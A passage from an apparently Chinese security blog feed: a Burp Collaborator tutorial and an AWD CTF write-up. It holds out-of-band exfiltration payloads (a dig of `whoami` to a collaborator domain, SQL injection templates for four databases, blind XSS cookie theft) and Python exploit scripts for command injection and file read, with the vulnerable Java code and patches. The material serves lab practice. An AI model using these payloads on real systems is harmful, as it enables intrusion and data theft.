function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="variable">$this</span>-&gt;keyc_length));</span><br><span class="line"><span class="variable">$cryptkey</span> = <span class="variable language_">$this</span>-&gt;keya.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">core</span>(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line"><span class="variable">$chkb</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>,<span class="number">26</span>).<span class="variable">$this</span>-&gt;keyb),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="variable language_">$this</span>-&gt;time &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="variable">$chkb</span>)&#123;</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">26</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直在忙毕设，很久没看安全了，看个PHP代码审计练练手，参考自&lt;a href=&quot;https://susec.me/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="代码审计" scheme="https://lhhxs.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHP反序列化" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Burp Collaborator-带外技术工具</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/Burp%20Collaborator-%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E5%B7%A5%E5%85%B7/"/>
    <id>https://lhhxs.github.io/2022/09/09/WEB/Burp%20Collaborator-%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E5%B7%A5%E5%85%B7/</id>
    <published>2022-09-09T15:39:20.043Z</published>
    <updated>2022-09-09T15:39:20.147Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Burp-Collaborator"><a href="#Burp-Collaborator" class="headerlink" title="Burp Collaborator"></a><strong>Burp Collaborator</strong></h2><h2 id="什么是Burp-Collaborator？"><a href="#什么是Burp-Collaborator？" class="headerlink" title="什么是Burp Collaborator？"></a><strong>什么是Burp Collaborator？</strong></h2><p>Burp Collaborator 是 OAST的产物，它可以帮你实现对响应不可见和异步的一个漏洞检测。</p><p>目前 Burp 发布的新版本中默认携带了 Burp Collaborator 模块</p><h2 id="Burp-Collaborator-原理"><a href="#Burp-Collaborator-原理" class="headerlink" title="Burp Collaborator 原理"></a><strong>Burp Collaborator 原理</strong></h2><p>Burp Collaborator 模型 参考上文带外攻击模型</p><p>Burp Collaborator 有自己专用域名 **<a href="https://link.zhihu.com/?target=http://burpcollaborator.net">http://burpcollaborator.net</a>**，类似于ceye平台，有一个权威DNS服务器，用户使用Collaborator模块时会给每一个用户会分配一个二级域名。</p><h2 id="Burp-Collaborator-配置"><a href="#Burp-Collaborator-配置" class="headerlink" title="Burp Collaborator 配置"></a><strong>Burp Collaborator 配置</strong></h2><p>Burp Collaborator 只是一个客户端，我们可以使用 Burp 给我们配置的默认带外服务器，也可以使用自己私有的服务器。</p><p><strong>Burp Collaborator 配置</strong></p><p>可以选择使用默认的配置 外带服务器，也可以自己设置外带服务器</p><p><img src="https://pic4.zhimg.com/v2-5999e05faaf9028561f2d1ea1773e5f3_b.jpg"></p><p>点击 <code>Run health check</code> 可以测试外带服务器服务是否正常</p><p><img src="https://pic3.zhimg.com/v2-12b1a03e21fac915aa20f5b025a7d966_b.jpg"></p><h2 id="Burp-Collaborator-使用"><a href="#Burp-Collaborator-使用" class="headerlink" title="Burp Collaborator 使用"></a><strong>Burp Collaborator 使用</strong></h2><p>打开 Collaborator 客户端</p><p><img src="https://pic1.zhimg.com/v2-c3ddf7013ca58f92e05bd8d45011d870_b.jpg"></p><p>使用 Client</p><p><img src="https://pic4.zhimg.com/v2-632b6aabb662a3cf2d81162a0e474bdf_b.jpg"></p><p>使用 <strong>dig</strong> 查询 域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig `whoami`.7jr9gk6gtnstix33jp6181eu2l8cw1.burpcollaborator.net</span><br></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/v2-bcb11aa2c75facc5db801a182f04a0b8_b.jpg"></p><p>查看<code>Client</code>返回的日志</p><p>可见，我们通过dig 查看DNS记录的方式，将whoami的命令携带发送到服务器。</p><p><img src="https://pic2.zhimg.com/v2-1d68eb6b08d8f092eb0ad91e468c18d9_b.jpg"></p><h2 id="Burp-Collaborator-应用"><a href="#Burp-Collaborator-应用" class="headerlink" title="Burp Collaborator 应用"></a><strong>Burp Collaborator 应用</strong></h2><p>使用Burp 提供的靶场，来介绍 Burp Collaborator的用法</p><p><strong>工作原理</strong></p><p>Burp Collaborator 生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入请求，那么就可以检测到对应的漏洞。</p><h3 id="检测外部服务交互（SSRF）"><a href="#检测外部服务交互（SSRF）" class="headerlink" title="检测外部服务交互（SSRF）"></a><strong>检测外部服务交互（SSRF）</strong></h3><blockquote><p>SSRF : 服务器在加载外部URL时，没有进行严格的过滤，导致用户可以请求或者绕过过滤请求其他域资源或者对服务器所在内网进行未授权访问。</p></blockquote><p><strong>检测过程</strong></p><ol><li>应用程序通过获取URL的内容的操作，拿到我们提供的有效载荷，并以不安全的方式执行，</li><li>根据我们的有效载荷，<code>它将首先对随机子域执行 DNS 查找，然后执行 HTTP 请求。</code></li><li>Collaborator 服务器接 DNS 查找和 HTTP 请求，两种交互都包含 Brup 放入 Collaborator 的随机数据。</li><li>Burp 轮询 Collaborator 服务器并询问 “你收到我的有效负载的任何交互了吗？”，然后 Collaborator 返回交互详细信息。</li><li>Burp 在将交互信息返回到 Client 。</li></ol><p><img src="https://pic4.zhimg.com/v2-0222c14dfef69e3c32bc958ebb023c7b_b.jpg"></p><h2 id="Burp靶场-盲SSRF"><a href="#Burp靶场-盲SSRF" class="headerlink" title="Burp靶场 -盲SSRF"></a><strong>Burp靶场 -盲SSRF</strong></h2><p><img src="https://pic2.zhimg.com/v2-45b71adf94da6055b8957f49ad85d679_b.jpg"></p><p>将Burp Collaborator Client 的获取的域名 添加HTTP请求的 Referer位置 等待几秒 然后点击poll now 会看到应用程序启动的DNS 和HTTP交互</p><h2 id="SQLi靶场-DNSLog-SQL注入"><a href="#SQLi靶场-DNSLog-SQL注入" class="headerlink" title="SQLi靶场 - DNSLog-SQL注入"></a><strong>SQLi靶场 - DNSLog-SQL注入</strong></h2><blockquote><p>SQL注入：用户输入的参数拼接到SQL语句中被执行，当输入的参数可控时，可以通过参数获取其他用户的数据。<br>常见数据库外带语法<br>MSSQL：<code>declare @p varchar(1024);set @p=(select 查询语句);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code><br>Oracle：<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br>MySQL：<code>select LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br>PostgreSQL:<code>create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;&#39;&#39;; execute c; END; $$ language plpgsql security definer; SELECT f();</code></p></blockquote><p>我这里使用 sqli 的靶场演示一下利用 burp Collaborator 实现DNSLog注入</p><p>前提条件：<code>secure_file_priv</code> 为空，（如果非空，只能读取对应目录下的文件）</p><p><code>select 1,2,LOAD_FILE(concat(&#39;\\\\&#39;,database(),&#39;~&#39;,&#39;xwxb0b0bnpm5bnjbo19apeivpmvfj4.burpcollaborator.net\\a&#39;)) --+</code></p><p><img src="https://pic2.zhimg.com/v2-204e15458a3ed5ede89d8d5352af1c35_b.jpg"></p><h2 id="Burp靶场-XSS-盲打cookie"><a href="#Burp靶场-XSS-盲打cookie" class="headerlink" title="Burp靶场 - XSS 盲打cookie"></a><strong>Burp靶场 - XSS 盲打cookie</strong></h2><blockquote><p>跨站点脚本（也称为 XSS）是一种 Web 安全漏洞，允许攻击者破坏用户与易受攻击的应用程序的交互。它允许攻击者绕过同源策略，该策略旨在将不同的网站相互隔离。跨站点脚本漏洞通常允许攻击者伪装成受害者用户，执行用户能够执行的任何操作，并访问用户的任何数据。如果受害者用户在应用程序中具有特权访问权限，那么攻击者可能能够完全控制应用程序的所有功能和数据。</p></blockquote><p>在 xss payload 中，添加自己burp collaborator 生成的域名</p><p><img src="https://pic2.zhimg.com/v2-6cdb77e786472b0d510ec25db86de945_b.jpg"></p><p>等待 管理员查看评论即可触发 xss payload 实现对cookie 的获取</p><p><img src="https://pic2.zhimg.com/v2-762cf51e5ff642e54da29fda1b4e0459_b.jpg"></p><h2 id="Burp靶场-带外命令注入"><a href="#Burp靶场-带外命令注入" class="headerlink" title="Burp靶场 - 带外命令注入"></a><strong>Burp靶场 - 带外命令注入</strong></h2><blockquote><p>操作系统命令注入（也称为 shell 注入）是一种 Web 安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令，并且通常会完全破坏应用程序及其所有数据。很多时候，攻击者可以利用操作系统命令注入漏洞来破坏托管基础设施的其他部分，利用信任关系将攻击转向组织内的其他系统。</p></blockquote><p><img src="https://pic4.zhimg.com/v2-12e88a68074d7b9180c0c88c1f1d18ff_b.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>还有更多用法，期待大家去发现，</p><p>一个小tips：多去看看官方文档，会发现更多神奇的用法。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Burp-Collaborator&quot;&gt;&lt;a href=&quot;#Burp-Collaborator&quot; class=&quot;headerlink&quot; title=&quot;Burp Collaborator&quot;&gt;&lt;/a&gt;&lt;strong&gt;Burp Collaborator&lt;/strong&gt;&lt;</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="burpsuite" scheme="https://lhhxs.github.io/tags/burpsuite/"/>
    
    <category term="java反序列化" scheme="https://lhhxs.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>记8月某次AWD</title>
    <link href="https://lhhxs.github.io/2022/09/09/writeup/%E8%AE%B08%E6%9C%88%E6%9F%90%E6%AC%A1AWD/"/>
    <id>https://lhhxs.github.io/2022/09/09/writeup/%E8%AE%B08%E6%9C%88%E6%9F%90%E6%AC%A1AWD/</id>
    <published>2022-09-09T14:43:26.552Z</published>
    <updated>2022-09-09T15:30:48.114Z</updated>
    
    <content type="html"><![CDATA[<p>打了一次内部赛AWD，第一次做java，收获颇丰，特此记录。</p><h1 id="攻防"><a href="#攻防" class="headerlink" title="攻防"></a>攻防</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/apiTest&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">apiTest</span><span class="params">(String param)</span> &#123;</span><br><span class="line">       <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(param);</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">           <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                   <span class="keyword">return</span> <span class="string">&quot;Something wrong!&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           inBr.close();</span><br><span class="line">           in.close();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           logger.error(e.toString());</span><br><span class="line">           <span class="keyword">return</span> e.toString();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;util&#x2F;apiTest接口 命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/apiTest?param=cat%20/flag</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxx&quot;</span>&#125;, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">url</span>):</span><br><span class="line">    url = url + <span class="string">&#x27;util/apiTest?param=cat%20%2fflag&#x27;</span></span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag(<span class="string">&#x27;http://127.0.0.1:10180/&#x27;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">        <span class="comment"># print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">        <span class="comment"># count = 10180</span></span><br><span class="line">        <span class="comment"># for i in range(1, 81):</span></span><br><span class="line">            <span class="comment"># url 为靶机ip</span></span><br><span class="line">            <span class="comment"># uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">            <span class="comment"># print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">            <span class="comment"># get_flag1(uri)</span></span><br><span class="line">            <span class="comment"># count += 100</span></span><br><span class="line">        <span class="comment"># time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/apiTest&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">apiTest</span><span class="params">(String param)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/image&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">       <span class="keyword">return</span> getImgBase64(filepath);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&#x2F;util&#x2F;image?filepath&#x3D;xxx 任意文件读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /util/image?filepath=/flag</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://xxxxx/api/flag&#x27;</span></span><br><span class="line">    proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: flag</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;xxxx&quot;</span>&#125;, proxies=proxies,</span><br><span class="line">                        data=data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = url + <span class="string">&#x27;util/image?filepath=/flag&#x27;</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;https&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        response = requests.get(url=url, headers=headers, data=data, proxies=proxies)</span><br><span class="line">        flag = <span class="built_in">bytes</span>.decode(base64.b64decode(response.text))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, flag):</span><br><span class="line">                flag = re.search(<span class="string">r&#x27;flag&#123;.*&#125;&#x27;</span>, flag)[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + url + <span class="string">&quot; connect shell success, flag is &quot;</span> + flag)</span><br><span class="line">                submit_flag(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot get flag&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Shell 404&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] &quot;</span> + url + <span class="string">&quot; connect shell failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag1(<span class="string">&quot;http://127.0.0.1:10180/&quot;</span>)</span><br><span class="line">    <span class="comment"># count = 1</span></span><br><span class="line">    <span class="comment"># while 1:</span></span><br><span class="line">    <span class="comment">#     print(f&quot;==========第&#123;count&#125;轮提交=========&quot;)</span></span><br><span class="line">    <span class="comment">#     count = 10180</span></span><br><span class="line">    <span class="comment">#     # count = 14680</span></span><br><span class="line">    <span class="comment">#     for i in range(1, 60):</span></span><br><span class="line">    <span class="comment">#         # url 为靶机ip</span></span><br><span class="line">    <span class="comment">#         uri = f&#x27;http://192.168.70.12:&#123;count&#125;/&#x27;</span></span><br><span class="line">    <span class="comment">#         print(f&quot;==========第&#123;i&#125;号靶机===========&quot;)</span></span><br><span class="line">    <span class="comment">#         get_flag1(uri)</span></span><br><span class="line">    <span class="comment">#         count += 100</span></span><br><span class="line">    <span class="comment">#     time.sleep(300) </span></span><br></pre></td></tr></table></figure><h3 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/image&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getImage</span><span class="params">(String filepath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;File doesn&#x27;t exist or is not a file.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/doc&quot;, method = RequestMethod.POST)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">DocParseX</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">           <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="literal">true</span>);</span><br><span class="line">           dbf.setNamespaceAware(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">           <span class="type">StringReader</span> <span class="variable">sr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(body);</span><br><span class="line">           <span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 